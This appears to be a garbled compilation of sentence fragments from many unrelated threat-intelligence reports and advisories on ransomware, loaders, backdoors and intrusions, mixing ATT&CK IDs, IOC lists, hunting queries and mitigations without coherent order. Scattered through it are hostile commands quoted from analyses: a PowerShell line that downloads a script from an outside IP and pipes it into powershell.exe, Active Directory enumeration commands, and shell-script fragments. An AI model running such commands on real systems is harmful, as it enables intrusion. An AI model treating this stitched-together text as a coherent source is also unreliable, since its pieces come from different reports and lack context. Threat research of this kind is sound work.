title: Inside the Mind of a Cyber Attacker: from Malware creation to Data Exfiltration (Part 1) url: https://blog.hacktivesecurity.com/index.php/2023/06/05/inside-the-mind-of-a-cyber-attacker-from-malware-creation-to-data-exfiltration-part-1/ 2 0 DISCLAIMER – This article is provided for educational and informational purposes only.
Configuration The backdoor contains an initial default configuration that is persisted on first run and loaded on subsequent runs.
And, if nothing else, make sure we’re adequately prepared for future attacks that likely will be more polished and thus pose a greater risk. 
In other words, the time at which this file appeared on the system should be the approximate time when the ransomware ran, to within several seconds.
[MITRE ATT&CK] Shared Webroot (T1051) Bristol Airport Flight Display Screens Failed After Ransomware Incident (September 18, 2018) 
// Find app name | extend OAuthApplicationId = tostring(FullAccessPermission[7].NewValue) //
The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.
Victims might also notice missing or deleted emails due to unauthorized access to email systems. 
T1003Pass the Hash – T1550.002Service Execution – T1569.002SMB/Windows Admin Shares – T1021.002Data Encrypted for Impact – T1486System Owner/User Discovery – T1033Permission Groups Discovery – T1069Application Layer Protocol – T1071Process Injection – T1055Group Policy Modification –
NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.
After obtaining a valid account, they use this account to access the victim’s VPN, Citrix or another remote service that allows access to the network of the victim.
CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.
This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain. 
[T1070.004], Modify Registry
Some of the accounts used were not in the victim’s Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.
"C: & cd \ & dir $temp\*.hive" cmd /C
[12/May/2023:21:17:39 +0000] "POST /wp-admin/plugin-install.php?wc-ajax=1" 200 0 - 16276 25453 193.169.195.64 -
Citrix Virtual Private Network (VPN)
Symmetric Cryptography [T1573.001] Encrypted Channel:
They configured each server with a different domain and used the servers for communication with compromised hosts.
Bidirectional Communication T1102.002 Multi-Stage Channels T1104 Ingress Tool Transfer T1105 Data Encoding: Standard Encoding T1132.001 Data Encoding: Non-Standard Encoding T1132.002 Remote Access Software T1219 Exfiltration Exfiltration Over C2 Channel T1041 Appendix: Appendix 1: IOCs of PowGoop goopdate[.]dll MD5: a27655d14b0aabec8db70ae08a623317 SHA-1: 7649c554e87f6ea21ba86bb26ea39521d5d18151 SHA-256: 2c92da2721466bfbdaff7fedd9f3e8334b688a88ee54d7cab491e1a9df41258f File type: Win32 DLL File size: 88.50 KB (90624 bytes) vcruntime140[.]dll MD5: cec48bcdedebc962ce45b63e201c0624 SHA-1: 81f46998c92427032378e5dead48bdfc9128b225 SHA-256: dd7ee54b12a55bcc67da4ceaed6e636b7bd30d4db6f6c594e9510e1e605ade92 File type: Win32 DLL File size: 91.50 KB (93696 bytes) IOCs 104.208.16[.]94:443 (TCP) 20.42.65[.]92:443 (TCP) 20.42.73[.]29:443 (TCP) libpcre2-8-0[.]dll MD5: 860f5c2345e8f5c268c9746337ade8b7 SHA-1: 6c55d3acdc2d8d331f0d13024f736bc28ef5a7e1 SHA-256: 9d50fcb2c4df4c502db0cac84bef96c2a36d33ef98c454165808ecace4dd2051 File type: Win32 DLL File size: 94.50 KB (96768 bytes) IOCs 20.189.173[.]20:443 (TCP) 20.189.173[.]21:443 (TCP) 20.42.73[.]29:443 (TCP) Appendix 2: IOCs of Small Sieve gram_app[.]exe MD5: 15fa3b32539d7453a9a85958b77d4c95 SHA-1: 11d594f3b3cf8525682f6214acb7b7782056d282 SHA-256: b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054 File type: Win32 EXE File size: 16.21 MB (16999598 bytes) IOCs 13.107.4[.]50:80 (TCP) 149.154[.]167.220:443 (TCP) 192.168.0[.]15:137 (UDP) 23.216.147[.]64:443 (TCP) 23.216.147[.]76:443 (TCP) a83f:8110:0:0:1400:1400:2800[:]3800:53 (UDP) 
The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\Windows\system32\cmd.exe /C adcomp.bat which contained the PowerShell command: powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument. 
A random blob is created by CryptGenRandom 0x3C bytes in length.
Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate “Microsoft Resource Compiler” signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll. 
TA0011 Command and Control T1219
Following detonation of Qakbot, the malware copied itself to "$CURRENTUSER\AppData\Roaming\Microsoft\Isoaahffo\djkuuhd.dll," as confirmed by the file's hashes shown below, and sets itself to auto run.
TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victim’s environment.
We also observed attempts to dump the NTDS.dit, which is a database of Active Directory information.
[TA0005] Rootkit [T1014] Obfuscated Files or Information:
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]: Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address > 
In October 2022, Intrinsec reported an incident in a French company also using HyperBro samples matching the structure we described in our 2021 investigation.
Unsecured Credentials: Credentials in Files T1552.001 
Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities.
Cisco Secure Malware Analytics helps identify malicious binaries and build protection into all Cisco Security products.
References [1] MITRE ATT&CK Version 11: Software – Ngrok Revisions Initial Version: November 16, 2022 
Initial Compromise Through Exploiting Publicly Facing Applications 
Domain IP ISP ASN offerings.cloud docs.azure-protection.cloud bankofamerica.us.org 104.168.174.80 Hostwinds LLC. 
These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.
Registry transaction forensics were briefly explored in a previous blog post.
FGLTA!tr.bdr W64/Havoc.
Overall, this supply chain attack highlights the importance of ensuring the security and integrity of the supply chain, as well as the need for businesses to remain vigilant and proactive in their security measures. 
This option is most likely used for shellcode payloads or further DLLs with ReflectiveLoader exports. 
Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month.
This was not used for C2 activities but only for receiving the exfiltrated data.
Multi Player (SA:MP) 0x05: GRE Ethernet flood 0x06: GRE IP flood 0x07: Generic TCP flood These specific commands, coupled with the absence of HTTP-related DDoS attacks, suggests that this campaign is primarily geared toward game server DDoS. Telnet Self-propagation The most significant difference in the new campaign was the complete replacement of the SSH brute forcing code with the more usual Telnet equivalent.
Figure 3.
Observed Changes While talking about the impact of NetWalker with our partners, we learned that the change in modus operandi not only affected the way the actors communicate with their victims.
This makes it easier to identify a potential Cobalt Strike server, however, defenders should be aware that this outcome alone is prone to false positives.
-s
Port 443:"Spawn
Specifically, CISA observed HTTPS activity from IP address 51.89.181[.]64 to the organization’s VMware server.
// fixup value upper byte and uint8(3) == 0 // always 0 and uint16(4) == uint16(6) and uint16(4) !
Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.
The protocols allow HTTP data compression to achieve minimal latency.
In addition to the ransomware’s uncommon behavior described above, the Rorschach binary itself contains additional interesting features, differentiating it further from other ransomware. 
In both cases, a configuration block containing a pipe-delimited list of IP addresses is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config. 
To answer that question, we decided to review the telemetry we had on the campaign.
Net.WebRequest]::Create(\\\"http://103.159.132.91/Robots.txt\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"" /f At the time of execution, both servers returned the same code pointing to the third server: C:\Windows\System32\cmd.exe /c "start powershell.exe -nop
Ransom Cartel accepted arguments. 
The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.
Security teams and individual users are advised to continuously update the security solutions of their systems and remain vigilant against threat actors who perform social engineering via job opportunity or salary increase-related lures. 
Once it completes that task, it then checks the amount of IPs found in the ARP table and completes a sum operation. 
This tool allows the cybercriminals to use credit cards in a batch when making fraudulent purchases.
Another interesting feature of the ISFB is that it stores three embedded binaries within the unpacked payload.
1 -a <ip>System network configuration discoveryping -n
Further, the PDB paths of some Crimson RAT samples we analyzed contain the word Wibemax, which is also contained in the PDB paths of Crimson RAT payloads observed in a previous Transparent Tribe campaign. 
KISS stands for “Keep it simple, stupid!”
Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.
Many of these tools are open source and readily available on the internet.
7AA35BA7030AFCD271436DE8173D7B2F317A1BFClibcurl.dllWin32/Agent.TWILookBack trojanized libcurl loader. 
[redacted]\[redacted]\Signed Forms & Income Docs\Shamjit
Phishing campaign analysis What we have observed is that the link in the phishing email points to Amazon Web Services click tracking service at awstrack[.]me.
[HOSTNAME]ExecutionATT&CK Technique: Command and Scripting Interpreter:
Gecko/20100101 Firefox/63.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64)
"._${r_i2}";exit); done; [[ "$md1" == "$md2" ]] && complete="true"; done; TMPFILE=$(mktemp /tmp/._XXXXXXXX);
Appendix A IOCs Project File Payload C2 Details 45c94900f312b2002c9c445bd8a59ae6 Remcos 04fc0ca4062dd014d64dcb2fe8dbc966 135.181.170.169:50845 d8a57534382a07cc0487b96350bca761 Remcos eb8b1d64429e00f2b3b49f886ee3b0b4 http://dl4.joxi.net/drive/2021/04/15/0048/3592/3153416/16/b8c104ce64.png d52d6bad3d11e9a72998608ccca572f5 Remcos 41c0bb6e89ad89af8eef7bec40d4acbb d66740b3ed3884c31d40e3747684411e RedLine 302207c3248257d4d9badf4bc4b75483 svhost-system-update.net:80 http://dl4.joxi.net/drive/2021/04/19/0048/3592/3153416/16/d07409594a.proj 43660f882cc5971ab83a810398487317 RedLine 6d3e8a2802848d259a3baaaa78701b97 37.1.206.16:7575 192b8ee95537dda7927ba3b45183e6a4 Remcos b8e9ce084d9d49f565f850c59b003bcf http://joxi.net/52ap4j7tkJER7m.proj 1ae425ac2890283ddcf11946e7e8f6ae QuasarRat 723f5e75239b66e3d08b83a131c7b66c 20621960888a6299123ce5a2df5eabba Remcos f174c03d177a04e81677e9c9a9eae0c8 27b62f7b4b285b880b8c81960aa60b15 Remcos cf45b793bc9ec86bfedfa165c01ede15 2d15a4c9184878e25bdf108bd58290b8 Remcos de2ff99ca086a8ad0f9b8027aef696ba 37bbbbc44c80ff4fe770ce78f6a37ebd Remcos 73790d28f4f8f0f4c402da66c8dc393f 603b1cc2d5488dcd8bb0a3b14429c88b Remcos 23c5bc4a2e69c3f171561b524ceb4098 62c8efb35b3b9c10e965ec5a236fed2d Remcos 4def35aedc86a946c13118e14127e0e9 a948e8d3222b9fa8ccbd091230098b78 Remcos 85c700ff566161c77a03f282fa48a246 ecdb2860af9ce2754d178c80e3303080 QuasarRat 7870a7c7e355d1fbf357c846d8bf2aea fe84ead033bfeaee70f84d8733b51e08 RedLine 4023e57ffbc87aa93621a7c2a6f0b425 Appendix B MITRE ATT&CK TTPs Matrix Technique ID Name Execution T1059.003 Windows Command Shell T1059.006 Python Persistence T1547.009 Shortcut Modification T1547.001 
Nemesis Project Infostealer The final payload loaded by Domino Loader is a .NET assembly with MD5 hash D9FFB202D6B679E5AD7303C0334CD000 and identified as a ‘Project Nemesis’ infostealer.
We also discovered scripts that pointed to malicious files hosted on the addresses 0x6D.13561923 (109.206.240.67) and 0x05.526436 (5.8.8.100). 
This technique encompasses multiple stages, including data encryption to render victim data inaccessible and threats to release stolen data on designated leak sites.
This security property and the definition of the hash function presented above have a few subtleties, which we now explore in more depth.\n
Figure 4.
Upon infection, the operator executed several Windows commands to gather basic system information.
TrustedForm is a digital certificate service provided by ActiveProspect, which provides marketing automation and compliance platforms. 
This technique relies on anonymous SMB pipe binds, which are disabled by default starting with Server 2016. 
[T1189] and exploitation of public-facing applications [T1190] Access to valid
Cobalt Strike a Defenders Guide  Part 2
Pass the HashTechniqueT1550.002https://attack.mitre.org/techniques/T1550/002/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Credential AccessTacticTA0006https://attack.mitre.org/tactics/TA0006/Brute Force: Password SprayingTechniqueT1110.003https://attack.mitre.org/techniques/T1110/003/Brute Force: Credential StuffingTechniqueT1110.004https://attack.mitre.org/techniques/T1110/004/OS Credential Dumping: LSASS MemoryTechniqueT1003.001https://attack.mitre.org/techniques/T1003/001/OS Credential Dumping:
Ursnif Malware Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .
Conclusion Due to the widespread adoption of Microsoft 365 services in the workplace and continued emphasis on a remote workforce, account hijackings now pose a more serious threat to organizations around the world than ever before.
They can be used by readers to tune or deploy detections in their own environments or for aiding additional research. 
This shows the decoded and uncompressed data. 
Indicator Note rtpbolamas88[.]com Qakbot Payload 92.97.203.51 Qakbot C2 90.78.138.217 90.104.22.28 86.99.54.39 86.225.214.138 86.202.48.142 82.127.204.82 81.229.117.95 80.47.57.131 80.13.205.69 72.203.216.98 71.212.147.224 67.10.175.47 49.245.82.178 217.165.1.53 213.67.255.57 190.75.95.164 184.176.35.223 149.74.159.67 109.11.175.42 107.146.12.26 103.140.174.19 eSentire’s Threat Response Unit (TRU) is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. 
Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading. 
On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue.
Some of the C&C servers in Operation Spalax use linkpc.net and publicvm.com subdomains, along with IP addresses that belong to Powerhouse Management.
By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.
Whos swimming in South Korean waters Meet ScarCrufts Dolphin
Redirecting servers make it difficult for defenders to attribute assessment activities to the backend team servers.
The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons. 
Upon execution, the ransomware encrypts files using the chacha20 algorithm.
net group /domain
-rf
Although they always used DLL sideloading to launch their malware, they never stopped changing the code structure of their shellcode loader.
File Payload URL February 20-23, 2023 hxxp[://]94[.]131[.]11[.]141/webdav/fda[.]dll URL BAT Payload URL February 20-23, 2023 Recall_2.22.url filename .URL
Make the environment variables associated with command history read only to ensure that the history is preserved. 
While previous research found that other threat actors had been exploiting this vulnerability, this appears to be new for the threat actor Vice Society.
Based on our analysis of the domain registration period and the URLs associated with the four domains, they belong to the same campaign that has been ongoing since at least November 2020.Malicious domainsRegistration periodm9b4s2[.]site November 2020tributaria[.]websiteJuly
FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.
num sectors and uint32(8) 
T1566.001Phishing: Spearphishing AttachmentTA410 uses malicious RTF and DOCX attachments to compromise victims. 
This technique is no longer effective because modern DNS servers have advanced technical specifications that one device cannot disrupt.
It can also update the local configuration when the corresponding command is received. 
SA Ransom:Win64/DarkBit VirTool:Win32/AtExecCommand Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of the indicators of compromise listed below. 
TeamTNT and WatchDog XMR wallet and IP address.
Active in-network defense strategies described by the MITRE Shield matrix are significant and play a critical role in detecting credential abuse in the network. 
T1140 Deobfuscate/Decode Files or Information Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded. 
It uses 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. 
This method of operation, widely utilized by advanced threat actors, is a classic within the realm of Advanced Persistent Threats (APTs). 
stop alive runassembly Upon launch, the malware sends a "Bot started" message to both the Debug server and the Telegram channel, indicating its successful execution. Figure 34.
In addition to encrypting files, Royal actors also engage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim does not pay the ransom. 
For this release, we used and considered the relevant data endpoint telemetry sources such as: Process Execution & Command Line Logging Windows Security Event ID 4663, Sysmon, or any Common Information Model compliant EDR technology Windows Security Event Log Windows System Event Log Windows PowerShell Script Block Logging 
In this campaign, the suspected Russian threat actors, use several highly obfuscated and underdevelopment custom loaders in order to infect those involved in the cryptocurrency industry with Enigma stealer (detected as TrojanSpy.MSIL.ENGIMASTEALER.YXDBC), which is a modified version of the Stealerium information stealer.
Fantasy wiper execution flow Initially, Fantasy creates a mutex to ensure that only one instance is running.
TROCLIENT anti-debugging technique. 
One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.
[D3-CAA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Gather Victim Network Information
title: Emotet Strikes Again - LNK File Leads to Domain Wide Ransomware -
This new version has similar features to the 2021 version, except that the C++ run-time type information (RTTI) classes we previously observed in 2021 had been removed, and that the code structure was changed to use the ASIO C++ asynchronous library.
Information Stealer We found a python-based information stealer used to collect internal information of victims.
We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. 
A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64. 
Deploying the payload The loader runs to the next stage with the help of Process Hollowing – one of the classic methods of PE injection. 
and it is created with a long complex password. 
This resource is hidden behind anti-sandboxing and debugger techniques, only to lead to more obfuscation and encryption techniques that lead to the final payload.
A change in targets.
This self-extracting archive is a type of compressed file that contains multiple files and can be executed as a program.
NT hashes for all the accounts on the local machine, including the local administrator credential hash, are stored in the SAM database.
title: When byte code bites: Who checks the contents of compiled Python files? url: https://securityboulevard.com/2023/06/when-byte-code-bites-who-checks-the-contents-of-compiled-python-files/ During our continuous threat hunting efforts to find malware in open-source repositories, the ReversingLabs team encountered a novel attack that used compiled Python code to evade detection.
= suppress error messages.hp<password> = encrypt both file data and headers with password. 
Dead or Alive An Emotet Story
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.
Arguments accepted by the Royal ransomware binary Figure 3.
Netskope Threat Labs also recommends that organizations review their security policies to ensure that they are adequately protected against these and similar phishing pages and scams: Inspect all HTTP and HTTPs traffic, including all web and cloud traffic, to prevent users from visiting malicious websites.
The following commands were executed and their standard output was redirected to append to a file in the user’s %APPDATA%\Local\Temp\ cmd /C
Related Ticket Search Dispatch Detects available indicators and routes them to dispatch related ticket search playbooks.
T1005Data from Local SystemFlowCloud can exfiltrate files from local file systems. 
It contains also possesses the ability to reduce debug strings (less OutputDebugStrings calls).
Custom XML parts is a feature that was introduced with Office Open XML format.
*file/
The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.
Execute commands via Command Prompt Execute PowerShell commands Inject and execute DLLs, shellcode, .NET assemblies, Cobalt Strike BOF files Manipulate processes (list, create, search, kill, etc.) Manipulate files and directories (list, download, upload, view, delete, etc.) 
We have seen Russian crimeware checking for the Armenian keyboard layout previously in malware such as KPot, we hypothesize this could be similar behavior. 
Figure 5.
Generation of AES Key and IV The malicious actors behind Royal ransomware use a form of intermittent encryption tactic to speed their encryption process: the ransomware first checks if the file size is divisible by 16, which is a requirement for AES (Figure 11).
Value contains "X-MS-Exchange-AntiSpam-MessageData" | project Timestamp, AccountObjectId, AccountDisplayName, ServicePrincipalId = tostring(RawEventData.
The team was then able to move from the private DC to workstations in the private subnet. 
Figure 7 – Extracting DPAPI Master Key Malware also tends to use multiple variants of credential enumeration APIs available within Windows.
Knowing which CVEs are present in the organization can give the organization an advantage in defending against MuddyWater. 
T1573.002 Encrypted Channel: Asymmetric Cryptography CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems. 
Example of AD DS Connector account 
ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.
MySql ping done by GoBruteforcer malware.
Possibly it is a bug in the implementation, and the if statement was intended to be a while loop instead.
With this in mind, we’ve gone over two important ways our platform adaptability has paid off in Advanced WildFire.
Dependency emulation is an approach we’ve recently prototyped and found useful to address this. 
Fig 3 — Domino Backdoor command structure Overlap with Lizar Toolkit Domino Backdoor shares a lot of overlap with malware associated with the Lizar Toolkit, which is attributed to threat group ITG14.
REMOTE
If a file is not found on disk and a domain name is used, it will search online.
We ran a PowerShell loader on the target host, which loaded a stageless SMB beacon in memory.
Analyzing the attachment using oledump shows that not only VBA macros but also an Object Linking and Embedding (OLE) object are embedded in the document.
Inhibit System Recovery Trigona operators use Turnoff.bat to delete Volume Shadow Copies. Conclusion Trigona is a newer strain of ransomware that, to date, has had minimal coverage by security news articles.
The breach is a result of grave neglect of security protocols All of your computers have been corrupted with Polar malware that has encrypted your files. 
The team maintained multiple Cobalt Strike servers hosted by a cloud vendor.
Investigation of subdomains and IP addresses yields another second-level domain, livehost[.]live, whose subdomain d89o0gm35t.livehost[.]live is indicated as a C2 server in one copy of Crosswalk (86100e3efa14a6805a33b2ed24234ac73e094c84cf4282426192607fb8810961).
T1074.001
During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names.
title: Vice Society:
Use an antivirus program, which may stop malicious code execution that cyber actors convince users to attempt to execute. 
SHA1 SHA256script_esxi.sh17d55dc09e2a3f10d4ee45156c2c53f1 317f296131b37a73c9a5d253015821dfdc8b1190 16d9e969457a76874e7452e687a7b6843c65ef75d1a4404d369074ad389f6c38MD5 SHA1 SHA256script_linux.sh 
They are actively seeking affiliates through postings on various dark web forums.
After mapping out all data, TTP’s etc., we discovered a very strong overlap with a campaign observed in 2019/2020.
This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging. 
The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities. 
These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: 
GoBruteforcer Makes Advances During our hunt for the samples related to GoBruteforcer campaign, we found another sample (SHA256 acc705210814ff5156957c028a8d6544deaca0555156504087fdc61f015d6834).
Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043] Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040]. 
The content of the value “ActiveDevice”: The payload used another ActiveX object to run a PowerShell command.
The result of execution of each command is returned to the sender via the invoke-response command. 
Mitigating the threat posed by Babadeda requires securing the device memory it targets.
Mitigation: Disable or remove PowerShell for non-administrative users [M1042],[M1026] or enable code-signing to execute only signed scripts [M1045]. 
Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs. 
Both data theft campaigns against Newegg and British Airways appear to have occurred around the same time, with the Newegg campaign starting a week earlier than the British Airways campaign.
To further reduce organizational exposure, Microsoft Defender for Endpoint customers can use the threat and vulnerability management capability to discover, prioritize, and remediate vulnerabilities and misconfigurations. 
Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server.
Win64.COBALT.BE CobaltStrike 451cef0085dc5b474cc5c68af079d0367d7d2ec73ae2210788beb5297e1fbd6d Trojan.
Function for processing incoming network-level communicationsAll messages at this level are encrypted in the backdoor's standard way, with the key string "commonkey". 
5.2.1 Transport protocols TCP TCP supports three types of messages: PingMessage (0x1), PongMessage (0x2), and DataMessage (0x3).
[CPG 4.3].
title: Operation Spalax:
In 2023, Xollam was observed as following a technique similar to the one followed by phishing campaigns: using Microsoft OneNote files as initial access to spread and deliver malware.
Message Hardening Message Authentication [D3-MAN] Transfer Agent Authentication
Malicious DLLs loaded into memory To locate the presence or distribution of malicious DLLs loaded into memory, run the following query DeviceImageLoadEvents | where SHA1 in (“d130bd75645c2433f88ac03e73395fba172ef676″,”1acf3108bf1e376c8848fbb25dc87424f2c2a39c”,”e257236206e99f5a5c62035c9c59c57206728b28″,”6fdd82b7ca1c1f0ec67c05b36d14c9517065353b”,”2f1a5a7411d015d01aaee4535835400191645023″,”bcb5a4dcbc60d26a5f619518f2cfc1b4bb4e4387″,”16505d0b929d80ad1680f993c02954cfd3772207″,”d8938528d68aabe1e31df485eb3f75c8a925b5d9″,”395da6d4f3c890295f7584132ea73d759bd9d094″,”c8b7f28230ea8fbf441c64fdd3feeba88607069e”,”2841391dfbffa02341333dd34f5298071730366a”,”2546b0e82aecfe987c318c7ad1d00f9fa11cd305″,”e2152737bed988c0939c900037890d1244d9a30e”) or SHA256 in (“ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6″,”dab758bf98d9b36fa057a66cd0284737abf89857b73ca89280267ee7caf62f3b”,”eb6fab5a2964c5817fb239a7a5079cabca0a00464fb3e07155f28b0a57a2c0ed”,”ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c”,”019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134″,”c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77″,”0f5d7e6dfdd62c83eb096ba193b5ae394001bac036745495674156ead6557589″,”e0b9eda35f01c1540134aba9195e7e6393286dde3e001fce36fb661cc346b91d”,”20e35055113dac104d2bb02d4e7e33413fae0e5a426e0eea0dfd2c1dce692fd9″,”2b3445e42d64c85a5475bdbc88a50ba8c013febb53ea97119a11604b7595e53d”,”a3efbc07068606ba1c19a7ef21f4de15d15b41ef680832d7bcba485143668f2d”,”92bd1c3d2a11fc4aba2735d9547bd0261560fb20f36a0e7ca2f2d451f1b62690″,”a58d02465e26bdd3a839fd90e4b317eece431d28cab203bbdde569e11247d9e2″,”cc082d21b9e880ceb6c96db1c48a0375aaf06a5f444cb0144b70e01dc69048e6″) Malicious DLLs created in the system or locally To locate the presence or distribution of malicious DLLs created in the system or locally, run the following query DeviceFileEvents | where SHA1 in (“d130bd75645c2433f88ac03e73395fba172ef676″,”1acf3108bf1e376c8848fbb25dc87424f2c2a39c”,”e257236206e99f5a5c62035c9c59c57206728b28″,”6fdd82b7ca1c1f0ec67c05b36d14c9517065353b”,”2f1a5a7411d015d01aaee4535835400191645023″,”bcb5a4dcbc60d26a5f619518f2cfc1b4bb4e4387″,”16505d0b929d80ad1680f993c02954cfd3772207″,”d8938528d68aabe1e31df485eb3f75c8a925b5d9″,”395da6d4f3c890295f7584132ea73d759bd9d094″,”c8b7f28230ea8fbf441c64fdd3feeba88607069e”,”2841391dfbffa02341333dd34f5298071730366a”,”2546b0e82aecfe987c318c7ad1d00f9fa11cd305″,”e2152737bed988c0939c900037890d1244d9a30e”) or SHA256 in (“ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6″,”dab758bf98d9b36fa057a66cd0284737abf89857b73ca89280267ee7caf62f3b”,”eb6fab5a2964c5817fb239a7a5079cabca0a00464fb3e07155f28b0a57a2c0ed”,”ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c”,”019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134″,”c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77″,”0f5d7e6dfdd62c83eb096ba193b5ae394001bac036745495674156ead6557589″,”e0b9eda35f01c1540134aba9195e7e6393286dde3e001fce36fb661cc346b91d”,”20e35055113dac104d2bb02d4e7e33413fae0e5a426e0eea0dfd2c1dce692fd9″,”2b3445e42d64c85a5475bdbc88a50ba8c013febb53ea97119a11604b7595e53d”,”a3efbc07068606ba1c19a7ef21f4de15d15b41ef680832d7bcba485143668f2d”,”92bd1c3d2a11fc4aba2735d9547bd0261560fb20f36a0e7ca2f2d451f1b62690″,”a58d02465e26bdd3a839fd90e4b317eece431d28cab203bbdde569e11247d9e2″,”cc082d21b9e880ceb6c96db1c48a0375aaf06a5f444cb0144b70e01dc69048e6″) SolarWinds processes launching PowerShell with Base64 To locate SolarWinds processes spawning suspected Base64-encoded PowerShell commands, run the following query DeviceProcessEvents| where InitiatingProcessFileName =~ “SolarWinds.BusinessLayerHost.exe”| where FileName =~ “powershell.exe”// Extract base64 encoded string, ensure valid base64 length| extend base64_extracted = extract(‘([A-Za-z0-9+/]{20,}[=]{0,3})’, 1, ProcessCommandLine)| extend base64_extracted = substring(base64_extracted, 0, (strlen(base64_extracted) / 4) *
We have obtained different zip files because Lumma Stealer sent multiple POST requests to the “c2/sock” address.
REG_DWORD /d
If NTLM must be enabled, enable Extended Protection for Authentication (EPA) to prevent some NTLM-relay attacks, and implement SMB signing to prevent certain adversary-in-the-middle and pass-the-hash attacks CPG 3.4].
= 0 
FEC3 FE_Trojan_Raw32_SILKWRAP_1 33341691_APT.Downloader.
The intrusions were detected and interrupted before the attackers could carry out further phases, such as deploying backdoors. 
Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.
To prevent a DNS poisoning attack, we should:Use DNSSEC, which uses public key cryptography.
Countries where we detected the attacks between August 2022 and January 2023 We also observed a small number of cases in: Malaysia Japan The Philippines Thailand Singapore Indonesia Myanmar Attack overview A simplified overview of the attack is shown in Figure 2.
User Execution (T1204) 
